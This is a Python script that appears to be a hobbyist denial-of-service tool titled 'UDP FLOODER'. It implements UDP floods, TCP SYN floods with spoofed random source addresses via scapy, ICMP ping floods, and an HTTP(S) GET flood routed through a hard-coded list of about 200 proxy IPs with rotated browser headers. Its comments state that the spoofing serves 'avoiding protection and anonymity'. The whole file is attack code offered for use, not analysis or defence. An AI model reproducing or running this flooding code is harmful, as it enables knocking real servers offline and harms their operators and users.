import threading #imports module "threading" used for multitaskinng
import random #imports module "random" used for outputting random numbers, strings in an array etc. used in this script for creating random IP addresses for the "scapy" import 
from scapy.all import * #imports all functions from "scapy" module - used for crafting/spoofing packets. we use this to send packets using the TCP and UDP protocol
import ping3 # imports module "ping3" - used for the ICMP method (layer 3) which sends a bunch of pings really fast to overload a server/router
import requests



# ASCII art ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
print(""" 
  _    _  _____   _____         ______  _       ____    ____   _____   ______  _____  
 | |  | ||  __ \ |  __ \       |  ____|| |     / __ \  / __ \ |  __ \ |  ____||  __ \ 
 | |  | || |  | || |__) |      | |__   | |    | |  | || |  | || |  | || |__   | |__) |
 | |  | || |  | ||  ___/       |  __|  | |    | |  | || |  | || |  | ||  __|  |  _  / 
 | |__| || |__| || |           | |     | |____| |__| || |__| || |__| || |____ | | \ \ 
  \____/ |_____/ |_|           |_|     |______|\____/  \____/ |_____/ |______||_|  \_/
                                                                                       
""")

print("""
                                        *@@&*(%@#@#.    &%    .%%,@*            .@#%(***./%*&*                                                                   
                                    (&/. #@&@@@&/.      .&/      .(&#            .@%(%,*/,% *@(                                                                   
                                #%#.                   ,@#**,,,/&#             #&,((/,/*/#*#/                                                                   
                            ,#(((.#*                     %&,/,..*@,           .#@ /(,/(#//(%&*                                                                   
                                */                      ,@,,.    (%         .#&(.%/(/(,,#/(##                                                                    
                                                        (@@@@@@@@@&.     ,%&#(,##,(%&/,* ,@(                                                                     
                                                        #%./,   ,,@/./&@% .#*#(..%..##%,.&(                                                                      
                                                        /@,((,   ,./&,(* ,%(#/  ,, .( ,/%@*                                                                       
                                                    ,(&@/,(*.    .,&(/#&/,#*,/#*.(/.,%&*                                                                         
                                                .(&%#, #**/.     ,.#&/.*%(//#/*((*#@#,                                                                           
                                                ,&%%* **,&**/       .##(%/#((%((%&&/.                                                                              
                                            *&&,  ,@&*.%*,(.      .#(,%%@@@%*                                                                                    
                                            ,%%. .#&#(&(.## ,.     ,,&/..                                                                                          
                                        *&(.,/%/ /#,(,,@,,,   .*,%%                                                                                             
                                        /@(./#%,,# ,/.#&%@,*,.   /@.                                                                                             
                                        ,@&((/#(/#.*(,(#. #&,**, /@,                                                                                              
                                    .  #@(,,##,/*@**&@(/(#@@&%%%@%((*,.....                                                                                      
                                %&,,%@&@@@@&#(#(((*,,...       . ...,,,...,*(%@@@@%%@(,/@*                                                                      
                                /&#/#&&@%%&&&&%%##(/,.  ,*. .,,**//////(((#%&&@&&#/#&#/%@.                                                                      
                                        #@, ./%**((#*,#@@%(#(/#%((/(&@#,,.                                                                                        
                                        *&%#(*/,*(. /(.,&&@(, .  .%&#%(                                                                                           
                                        /@/(#(%(/ */*(/(#..*#&&@@(,*&(                                                                                           
                                        &&..(###@/,##*(.  ,/. ,( .*%%&@#..                                                                                      
                                            /&, ,#/@. (%(/&*  .*.  .#...#%#&&@@(                                                                                   
                                            .#&*  #(#%((*,,#...,(,../%//%/,&  .%&*                                                                                
                                                /&%, *(*/%*  .//. ./%(/(/.&  ,((((%&,                                                                              
                                                *#&(*(/  #%#/*#%(*(%#(  /(*/(..#.&(                                                                             
                                                    ,&@@@(**(. *@%#/  #(,(* ,((*&*&/                                                                            
                                                    ,%//,, *&&@@#/#*%@@&, (@%##. */&/                                                                           
                                                    ,%/.   ,%(.**(@&#**(,%/(/ ,*.(./%,                                                                          
                                                    ,%#,   ,%(  ./%#&@#./%.,*,(, .#(&*                                                                          
                                                    ,%#,   .%/   ,###,#&,/(*(. #*(*,%*                                                                          
                                                    ,%#,   .%(    (##.,&%#/ ,#(# .%&#.                                                                          
                                                    ,%(,   .#/    /%#.*&#&(/(* #,*#&/                                                                           
                                                    *#(,   .(*    /%(/@(%* (#,(, ,&/                                                                            
                                                    *#(,   .(*    /%@&%/(../,.(*%&,                                                                             
                                                    *#(.   .(,    *%&(//%/#/ *(@(                                                                               
                                                    *%#,   .(*    *%@%## .#/#&(                                                                                 
                                                    *##.   .(*    *%&%&,/(#&*                                                                                   
                                                    .(@&/    .(/    *%&&*(@(.                                                                                     
                                               .#@%#@&,    .#/    ,%@&/.                                                                                        
                                            .#@#/%,/&%,    .#/    ,%#.                                                                                          
                                          ,%&/#%#*#%@&,    .#/    .##.                                                                                          
                                            %&*(*/*,#%&&%/    .#/     (#.                                                                                          
                                       /@,/&/%/*@.#@@%(    .(*    .(#.                                                                                          
                                     .%# #/##(*(@(. /#(     /,    ,%#.                                                                                          
                                      #%(@####%@/    /#/     ,.    .&%. *%&&&&&&%(,                                                                              
                                    ,&/#(%(#(&,     /%/            (&@&##(((/(//%/&%,                                                                           
                                    *%*&(%((%*      (#/          .(&%#(((@%@&%%%@###&/                                                                          
                                    *%/&%/&%%.      /%,       .#@%%((%&#%&,      *@%#&,                                                                         
                                    .%/*@&/(@(      ,%/.  ,#@&%/#*#(/&@,         (@%#&,                                                                         
""")



print(""" _______   __      __         ______   __        ________  ______  ________
/       \ /  \    /  |       /      \ /  |      /        |/      |/        |
$$$$$$$  |$$  \  /$$/       /$$$$$$  |$$ |      $$$$$$$$/ $$$$$$/ $$$$$$$$/
$$ |__$$ | $$  \/$$/        $$ |__$$ |$$ |      $$ |__      $$ |  $$ |__
$$    $$<   $$  $$/         $$    $$ |$$ |      $$    |     $$ |  $$    |
$$$$$$$  |   $$$$/          $$$$$$$$ |$$ |      $$$$$/      $$ |  $$$$$/
$$ |__$$ |    $$ |          $$ |  $$ |$$ |_____ $$ |       _$$ |_ $$ |_____
$$    $$/     $$ |          $$ |  $$ |$$       |$$ |      / $$   |$$       |
$$$$$$$/      $$/           $$/   $$/ $$$$$$$$/ $$/       $$$$$$/ $$$$$$$$/
""")

#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# asks for method to DDoS 

method = int(input("""What method?
1. UDP 
2. TCP
3. ICMP (Layer 3)
4. HTTPS (Layer 7):\n"""))

#--------------------------------------------------------

#variables for the target ip address, sets port to default 80, packet size to 200, asks how many threads to use (concurrent tasks), asks how many requests to send in total per thread. 
if method == 4:
    targ = str(input("What is the URL? "))
else:
    targ = str(input("What is the IP? "))

Port = 80
x = int(input("How many requests to send? "))
packet_size = 200
threads = int(input("How many threads? "))


# if i wanna input my own packet size, must be atleast 28 for the TCP header, or 40 for UDP header
if packet_size < 28:
    raise ValueError("Packet size must be at least 28 bytes (20 for IP header + 8 for TCP header).")

# creates random IP address for scapy import to spoof the packet
def randomIP():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

#sets done to False so we can use a while loop
done = False



#UDP METHOD ---------------------------------------------------------------------------------------------------------

def udp_method(): # creates function "udp_method"

    global done # globalises "done" variable - lets us use it in this function

    c = 0 # sets "c" to 0 so we can count how many packets have been sent (per thread)

    payload_size = packet_size - 20 - 8  # Adjust for the IP header (20 bytes) and UDP header (8 bytes)
    payload = "A" * payload_size  # Create the payload - "A" = 1 byte

    while not done: #while done = False, do this:

        for _ in range(x): #loops through the code below for the amount of requests specified from "x" imput above

            if done: #when done is made True (after all requests sent), then stop the loop
                break
                
            ip = IP(src=randomIP(), dst=targ) #crafts where the packet is going and where its coming from - we use a random IP address generator from above for avoiding protection and anonymity
            udp = UDP(dport=Port)  # variable for the port (dport = destination port)
            raw = Raw(load=payload) #sets the payload for the script to send e.g. 1000 bytes per request
            pkt = ip / udp / raw # puts all the above together to craft the whole packet

            send(pkt, verbose=False) # sends the packet to the target, while not outputing anything, we create our own output below

            c += 1 # updates the count for the print below
            print("Sent ! Packet number: ", c, "UDP method") # creates an output telling us that we sent our packet, and how many we have sent (per thread)

        done = True # sets variable "done" to true so we can break out of the loop 

#Finish udp method --------------------------------------------------------------------------------------------------



#TCP METHOD ---------------------------------------------------------------------------------------------------------

def tcp_method():

    global done # globalises "done" variable - lets us use it in this function

    c = 0 # sets "c" to 0 so we can count how many packets have been sent (per thread)

    payload_size = packet_size - 20 - 20  # Adjust for the IP header (20 bytes) and TCP header (20 bytes)
    payload = "A" * payload_size  # Create the payload

    while not done: #while done = False, do this:

        for _ in range(x): #loops through the code below for the amount of requests specified from "x" imput above

            if done: #when done is made True (after all requests sent), then stop the loop
                break
                
            ip = IP(src=randomIP(), dst=targ) # crafts where the packet is going and where its coming from - we use a random IP address generator from above for avoiding protection and anonymity
            tcp = TCP(sport=RandShort(), dport=Port, flags="S") # variable for the port ("dport"" = destination port, "sport" = source port) flags "S" specifies that we are sending SYN packets (syn flood)
            raw = Raw(load=payload) # sets the payload for the script to send e.g. 1000 bytes per request
            pkt = ip / tcp / raw # puts all the above together to craft the whole packet

                
            send(pkt, verbose=False) # sends the packet to the target, while not outputing anything, we create our own output below

            c += 1 # updates the count for the print below
            print("Sent ! Packet number: ", c, "TCP method") # creates an output telling us that we sent our packet, and how many we have sent (per thread)

        done = True # sets variable "done" to true so we can break out of the loop 

#Finish TCP Method --------------------------------------------------------------------------------------------------



#ICMP METHOD --------------------------------------------------------------------------------------------------------

def icmp_method():

    global done # globalises "done" variable - lets us use it in this function

    for _ in range(x): #loops through the code below for the amount of requests specified from "x" imput above

        if done: #when done is made True (after all requests sent), then stop the loop
            break

        ping3.verbose_ping(targ , size=B , timeout=wait, ttl=250) #sends ICMP ping to the target IP address (targ), with the specified byte size (B), sends a new packet every x seconds (timeout=wait), ttl stands for ->
        # "Time to Live" - basically gives the packet a higher chance to reach the target (higher = more chance to reach targ)


    done = True # sets variable "done" to true so we can break out of the loop 

#Finish ICMP Method -------------------------------------------------------------------------------------------------




#THREADING !!!!!!!!!!! 

if method == 1: # if method == 1 aka UDP:

    for _ in range(threads): # Start x amount of threads

        t = threading.Thread(target=udp_method, daemon=True) #sets the thread target to the function "udp_method", daemon means we can exit the thread before its finished its done

        t.start() # starts the thread and function
        

if method == 2: # if method == 2 aka TCP:

    for _ in range(threads): # Start x amount of threads

        t = threading.Thread(target=tcp_method, daemon=True) #sets the thread target to the function "tcp_method", daemon means we can exit the thread before its finished its done

        t.start() # starts the thread and function


if method == 3: # if method == 3 aka ICMP:

    wait = float(input("how long should we wait for a response for?")) #asks how long to wait for a response from the target
    B = int(input("Size of packet? 1-65500")) # asks for size of ICMP packet we want to send

    for _ in range(threads): # Start x amount of threads

        t = threading.Thread(target=icmp_method, daemon=True) #sets the thread target to the function "icmp_method", daemon means we can exit the thread before its finished its done

        t.start() # starts the thread and function




user_agent_list = [
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Flare_Y3 Build/O11019)",
    "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T355Y Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; LM-Q630 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; Le2 x527) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 YaBrowser/19.3.5.299.00 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; KFMUWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; wbx 1.0.0; Zoom 3.6.0; Microsoft Outlook 15.0.5215; ms-office; MSOffice 15)",
    "Mozilla/5.0 (Linux; U; Android 10; tr-tr; Redmi 8A Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.13.2-gn",
    "Mozilla/5.0 (Linux; Android 10; SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 OPR/70.0.3728.95",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; PSPTD21NA Build/O11019)",
    "Mozilla/5.0 (Linux; Android 9; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/46.01.4.5140",
    "Mozilla/5.0 (Linux; Android 11; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; InfoPath.3; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Microsoft Outlook 15.0.5233; Microsoft Outlook 15.0.5233; ms-office; MSOffice 15)",
    "Dalvik/2.1.0 (Linux; U; Android 9; JAT-LX3 Build/HONORJAT-LX3)",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/55.0.2883.79 Mobile/17E262 Safari/602.1",
    "Mozilla/5.0 (Linux; Android 9; SM-J701M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; JMM-L22 Build/HUAWEIJMM-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51",
    "Mozilla/5.0 (Linux; Android 9; SM-A207F Build/PPR1.180610.011; Cake) AppleWebKit/537.36 (KHTML, like Gecko) Version/6.0.21 Chrome/83.0.4103.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; ASUS_Z01RD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Nokia 1 Plus Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 11; Infinix PR652B Build/RP1A.201005.001)",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 11; SM-F916U Build/RP1A.200720.012)",
    "Mozilla/5.0 (Linux; Android 10; CPH1819) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36"
]


accept_headers = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,image/avif,image/webp",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,image/avif",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7,image/avif,image/webp",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8,image/webp;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp;q=0.8,*/*;q=0.7,image/avif",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif;q=0.8,image/webp;q=0.7,*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,image/webp;q=0.7,image/avif;q=0.6",
    "text/html,application/xhtml+xml,application/xml;q=0.8,image/avif,image/webp,*/*;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.8,*/*;q=0.9,image/avif,image/webp",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,image/webp,image/apng",

    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
    "text/html,application/xhtml+xml,application/xml;q=0.9", 
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.8;q=0.7;q=0.6,*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*",

    "*/*",
    "text/html",
    "text/html,application/xhtml+xml",
    "text/html,application/xhtml+xml,*/*",
    "text/html,application/xhtml+xml,application/xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,image/png",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,image/png,*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,image/webp;q=0.7,image/avif;q=0.6,image/png;q=0.5"
]

accept_language_list = [
    "Accept-Language: en-US;q=0.9, es-ES;q=0.8, fr-FR;q=0.7",
    "Accept-Language: pt-BR;q=0.9, de-DE;q=0.6, zh-CN;q=0.5",
    "Accept-Language: ja-JP;q=0.9, en-GB;q=0.8, it-IT;q=0.7",
    "Accept-Language: es-MX;q=0.9, ru-RU;q=0.6, en-CA;q=0.5",
    "Accept-Language: fr-FR;q=0.9, ko-KR;q=0.8, es-ES;q=0.7",
    "Accept-Language: de-DE;q=0.9, en-US;q=0.8, zh-CN;q=0.7",
    "Accept-Language: it-IT;q=0.9, pt-BR;q=0.8, ja-JP;q=0.7",
    "Accept-Language: zh-CN;q=0.9, ru-RU;q=0.8, en-GB;q=0.7",
    "Accept-Language: ko-KR;q=0.9, es-MX;q=0.8, fr-FR;q=0.7",
    "Accept-Language: en-CA;q=0.9, de-DE;q=0.8, it-IT;q=0.7",
    "Accept-Language: en-GB;q=0.9, fr-FR;q=0.8, de-DE;q=0.7",
    "Accept-Language: zh-TW;q=0.9, en-US;q=0.8, es-ES;q=0.7",
    "Accept-Language: ar-SA;q=0.9, en-GB;q=0.8, fr-CA;q=0.7",
    "Accept-Language: pl-PL;q=0.9, en-US;q=0.8, ru-RU;q=0.7",
    "Accept-Language: en-GB;q=0.9, fr-FR;q=0.7, de-DE;q=0.6",
    "Accept-Language: hi-IN;q=0.9, en-US;q=0.8, fr-FR;q=0.7",
    "Accept-Language: tr-TR;q=0.9, en-GB;q=0.8, de-DE;q=0.7",
    "Accept-Language: en-US;q=0.9, it-IT;q=0.8, es-ES;q=0.7",
    "Accept-Language: en-GB;q=0.9, es-MX;q=0.8, fr-FR;q=0.7",
    "Accept-Language: en-US;q=0.9, pl-PL;q=0.7, de-DE;q=0.6",
    "Accept-Language: en-GB;q=0.9, pt-PT;q=0.7, es-ES;q=0.6",
    "Accept-Language: it-IT;q=0.9, de-DE;q=0.8, en-US;q=0.7",
    "Accept-Language: en-GB;q=0.9, fr-FR;q=0.8, es-MX;q=0.7",
    "Accept-Language: en-CA;q=0.9, es-ES;q=0.8, fr-FR;q=0.7",
    "Accept-Language: en-US;q=0.9, ko-KR;q=0.8, es-ES;q=0.7",
    "Accept-Language: zh-CN;q=0.9, en-US;q=0.8, de-DE;q=0.7",
    "Accept-Language: en-US;q=0.9, ru-RU;q=0.8, de-DE;q=0.7",
    "Accept-Language: fr-FR;q=0.9, de-DE;q=0.8, en-US;q=0.7",
    "Accept-Language: en-US;q=0.9, fr-CA;q=0.8, es-MX;q=0.7",
    "Accept-Language: es-ES;q=0.9, pt-BR;q=0.8, en-US;q=0.7",
    "Accept-Language: en-GB;q=0.9, pl-PL;q=0.8, es-MX;q=0.7",
    "Accept-Language: it-IT;q=0.9, en-GB;q=0.8, de-DE;q=0.7",
    "Accept-Language: de-DE;q=0.9, en-US;q=0.8, es-ES;q=0.7",
    "Accept-Language: en-US;q=0.9, zh-TW;q=0.8, es-ES;q=0.7",
    "Accept-Language: fr-CA;q=0.9, en-US;q=0.8, de-DE;q=0.7",
    "Accept-Language: en-GB;q=0.9, fr-FR;q=0.8, it-IT;q=0.7",
    "Accept-Language: ru-RU;q=0.9, en-US;q=0.8, fr-FR;q=0.7",
    "Accept-Language: es-MX;q=0.9, en-US;q=0.8, zh-CN;q=0.7",
    "Accept-Language: en-US;q=0.9, zh-CN;q=0.8, es-ES;q=0.7",
    "Accept-Language: fr-FR;q=0.9, en-GB;q=0.8, zh-CN;q=0.7",
    "Accept-Language: zh-CN;q=0.9, ko-KR;q=0.8, en-GB;q=0.7",
    "Accept-Language: pt-BR;q=0.9, en-US;q=0.8, fr-FR;q=0.7"
]






headers1 = {
    'User-Agent': random.choice(user_agent_list),
    'Accept': random.choice(accept_headers),
    'Accept-Language': random.choice(accept_language_list),
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}


#--------------------------------
proxies_list = [
    "http://156.228.85.1:3128",
    "http://154.213.194.149:3128",
    "http://156.228.177.173:3128",
    "http://156.233.85.182:3128",
    "http://156.253.178.149:3128",
    "http://156.228.80.31:3128",
    "http://156.228.171.40:3128",
    "http://156.228.99.127:3128",
    "http://156.233.92.43:3128",
    "http://104.207.33.42:3128",
    "http://104.207.62.8:3128",
    "http://156.228.181.109:3128",
    "http://156.228.89.29:3128",
    "http://156.228.174.245:3128",
    "http://154.213.198.218:3128",
    "http://156.228.182.136:3128",
    "http://104.207.59.157:3128",
    "http://156.228.92.103:3128",
    "http://156.228.189.164:3128",
    "http://156.233.85.124:3128",
    "http://154.94.14.152:3128",
    "http://156.249.138.157:3128",
    "http://104.207.59.114:3128",
    "http://45.201.11.207:3128",
    "http://156.233.92.235:3128",
    "http://104.167.30.221:3128",
    "http://104.207.46.61:3128",
    "http://104.207.52.140:3128",
    "http://156.228.177.97:3128",
    "http://156.228.108.19:3128",
    "http://156.228.0.94:3128",
    "http://154.94.14.8:3128",
    "http://156.253.171.37:3128",
    "http://156.228.110.176:3128",
    "http://156.228.94.214:3128",
    "http://156.228.118.3:3128",
    "http://156.228.184.30:3128",
    "http://156.228.0.6:3128",
    "http://156.228.182.125:3128",
    "http://45.201.11.174:3128",
    "http://104.207.43.227:3128",
    "http://45.202.77.215:3128",
    "http://156.228.181.235:3128",
    "http://104.207.51.117:3128",
    "http://156.228.101.203:3128",
    "http://156.233.92.124:3128",
    "http://156.233.84.86:3128",
    "http://45.202.78.68:3128",
    "http://156.228.109.151:3128",
    "http://104.207.50.58:3128",
    "http://156.228.91.4:3128",
    "http://104.207.57.197:3128",
    "http://154.213.198.58:3128",
    "http://156.253.166.84:3128",
    "http://104.207.55.207:3128",
    "http://156.228.177.144:3128",
    "http://156.228.115.240:3128",
    "http://156.228.175.68:3128",
    "http://156.228.116.43:3128",
    "http://156.228.175.29:3128",
    "http://156.228.124.42:3128",
    "http://156.253.168.159:3128",
    "http://156.253.179.83:3128",
    "http://156.228.101.106:3128",
    "http://104.207.49.5:3128",
    "http://156.228.117.82:3128",
    "http://156.249.137.231:3128",
    "http://156.228.88.60:3128",
    "http://104.167.27.0:3128",
    "http://156.228.180.1:3128",
    "http://104.167.27.196:3128",
    "http://104.207.47.167:3128",
    "http://154.213.194.56:3128",
    "http://156.228.180.132:3128",
    "http://156.228.119.130:3128",
    "http://156.228.175.236:3128",
    "http://156.253.172.167:3128",
    "http://104.207.56.240:3128",
    "http://104.207.41.97:3128",
    "http://154.213.204.233:3128",
    "http://156.253.169.152:3128",
    "http://156.253.174.47:3128",
    "http://156.228.102.208:3128",
    "http://156.228.184.154:3128",
    "http://104.207.56.243:3128",
    "http://156.253.167.89:3128",
    "http://156.233.89.80:3128",
    "http://104.207.51.53:3128",
    "http://156.233.95.19:3128",
    "http://156.228.81.7:3128",
    "http://156.228.94.239:3128",
    "http://156.228.103.237:3128",
    "http://156.233.94.135:3128",
    "http://156.228.116.159:3128",
    "http://104.167.28.126:3128",
    "http://104.207.33.173:3128",
    "http://156.228.107.56:3128",
    "http://156.228.171.20:3128",
    "http://216.229.112.25:8080",
    "http://44.219.175.186:80",
    "http://204.236.137.68:80",
    "http://63.35.64.177:3128",
    "http://54.248.238.110:80",
    "http://3.90.100.12:80",
    "http://54.152.3.36:80",
    "http://212.193.4.133:1080",
    "http://27.79.235.179:16000",
    "http://204.236.176.61:3128",
    "http://27.79.168.165:16000",
    "http://52.67.10.183:80",
    "http://3.78.92.159:3128",
    "http://18.228.198.164:80",
    "http://52.196.1.182:80",
    "http://54.233.119.172:3128",
    "http://43.201.121.81:80",
    "http://43.200.77.128:3128",
    "http://46.51.249.135:3128",
    "http://3.123.150.192:80",
    "http://18.185.169.150:3128",
    "http://18.228.149.161:80",
    "http://3.124.133.93:3128",
    "http://3.127.62.252:80",
    "http://35.79.120.242:3128",
    "http://35.76.62.196:80",
    "http://3.37.125.76:3128",
    "http://43.202.154.212:80",
    "http://35.72.118.126:80",
    "http://3.71.239.218:3128",
    "http://3.126.147.182:80",
    "http://13.208.56.180:80",
    "http://200.174.198.86:8888",
    "http://103.191.196.76:8080",
    "http://165.154.225.237:8080",
    "http://13.56.192.187:80",
    "http://184.169.154.119:80",
    "http://54.67.125.45:3128",
    "http://37.187.25.85:80",
    "http://44.195.247.145:80",
    "http://44.218.183.55:80",
    "http://13.37.73.214:80",
    "http://15.236.106.236:3128",
    "http://13.36.87.105:3128",
    "http://13.36.113.81:3128",
    "http://13.36.104.85:80",
    "http://13.38.176.104:3128",
    "http://13.37.59.99:3128",
    "http://13.37.89.201:80",
    "http://13.38.153.36:80",
    "http://43.128.110.204:8888",
    "http://47.251.122.81:8888",
    "http://72.10.164.178:1417",
    "http://222.252.194.204:8080",
    "http://72.10.160.90:1365",
    "http://27.79.181.9:16000",
    "http://52.73.224.54:3128",
    "http://113.160.132.195:8080",
    "http://34.80.240.128:8080",
    "http://3.141.217.225:80",
    "http://3.212.148.199:3128",
    "http://3.139.242.184:80",
    "http://118.27.111.97:80",
    "http://176.32.35.11:8888",
    "http://27.79.160.196:16000",
    "http://203.144.144.146:8080",
    "http://27.79.160.233:16000",
    "http://113.160.133.32:8080",
    "http://13.59.156.167:3128",
    "http://27.79.251.38:16000",
    "http://27.79.229.169:16000",
    "http://3.130.65.162:3128",
    "http://3.12.144.146:3128",
    "http://3.127.121.101:80",
    "http://3.122.84.99:3128",
    "http://3.136.29.104:80",
    "http://27.79.252.249:16000",
    "http://27.79.170.1:16000",
    "http://178.178.112.94:8080",
    "http://8.219.97.248:80",
    "http://34.215.74.117:1080",
    "http://54.212.22.168:3128",
    "http://44.227.181.1:1080",
    "http://44.226.167.102:3128",
    "http://27.79.166.96:16000",
    "http://27.79.252.95:16000",
    "http://65.108.159.129:1080",
    "http://171.248.203.237:10001",
    "http://35.161.172.205:1080",
    "http://3.21.101.158:3128",
    "http://52.35.240.119:1080",
    "http://54.183.181.50:80",
    "http://47.90.205.231:33333",
    "http://47.251.43.115:33333",
    "http://115.72.2.65:10001",
    "http://217.219.74.130:8888",
    "http://47.237.121.151:10034",
    "http://93.91.112.247:41258",
    "http://116.102.108.46:10001",
    "http://27.79.251.131:16000"
    "http://156.233.75.235:3128",
    "http://156.228.94.212:3128"
]





def http_method():
    for i in range(x):
        ports = ("80","443")
        port = random.choice(ports)
        targ1 = targ+":"+port

        global headers1
        proxy = random.choice(proxies_list)
        
        # Create a dictionary to specify the proxy for this request
        proxies = {
            'http': proxy,
            'https': proxy
        }

        if port == "80":
            try:
                response = requests.get("http://"+targ1, headers=headers1, proxies=proxies, timeout=10)
                print(f"Status Code 'GET': {response.status_code} | Proxy: {proxy} | TARGET : {targ1}")
            except requests.RequestException as e:
                print(f"Request failed for proxy {proxy}: {e}")
        if port == "443":
            try:
                response = requests.get("https://"+targ1, headers=headers1, proxies=proxies, timeout=10)
                print(f"Status Code 'GET': {response.status_code} | Proxy: {proxy} | TARGET : {targ1}")
            except requests.RequestException as e:
                print(f"Request failed for proxy {proxy}: {e}")


if method == 4:
    for _ in range(threads): # Start x amount of threads

        t = threading.Thread(target=http_method, daemon=True) #sets the thread target to the function "http_method", daemon means we can exit the thread before its finished its done

        t.start() # starts the thread and function



#lets us stop whenever we want by pressing enter, thanks to the daemon threads
input("Press Enter to quit\n")
done = True



